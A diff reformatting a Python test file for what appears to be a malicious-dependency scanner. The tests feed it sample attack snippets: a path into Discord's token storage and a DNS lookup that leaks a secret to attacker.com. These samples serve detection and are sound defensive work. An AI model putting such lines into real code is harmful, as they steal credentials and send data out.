@@ -10,12 +10,15 @@ def make_diff(lines, path="test.py"):
 
 # ─── Type 7: Credential harvesting ────────────────────────────────────────
 
+
 class TestCredentialHarvesting:
     def test_discord_token_access(self):
-        diff = make_diff([
-            "import os",
-            "path = os.path.expanduser('~/.config/discord/Local Storage/leveldb')",
-        ])
+        diff = make_diff(
+            [
+                "import os",
+                "path = os.path.expanduser('~/.config/discord/Local Storage/leveldb')",
+            ]
+        )
         m = scan_diff_full(diff)
         assert any(r.rule_id == "DISCORD_TOKEN_THEFT" for r in m)
 
@@ -41,6 +44,7 @@ class TestCredentialHarvesting:
 
 
 # ─── Webhook exfil expansion ──────────────────────────────────────────────
+
 
 class TestWebhookExfil:
     def test_pipedream(self):
@@ -86,6 +90,7 @@ class TestWebhookExfil:
 
 # ─── Type 8: DNS exfiltration ─────────────────────────────────────────────
 
+
 class TestDNSExfiltration:
     def test_dns_resolve_call(self):
         diff = make_diff(["dns.resolve(f'{secret}.attacker.com', callback)"])
@@ -105,6 +110,7 @@ class TestDNSExfiltration:
 
 
 # ─── Type 10: Native binding injection ────────────────────────────────────
+
 
 class TestNativeBindingInjection:
     def test_binding_gyp(self):
@@ -135,6 +141,8 @@ class TestNativeBindingInjection:
 
 # ─── Pattern count ────────────────────────────────────────────────────────
 
+
 def test_total_patterns_at_least_35():
     from depvet.analyzer.rules import MALICIOUS_PATTERNS
+
     assert len(MALICIOUS_PATTERNS) >= 35
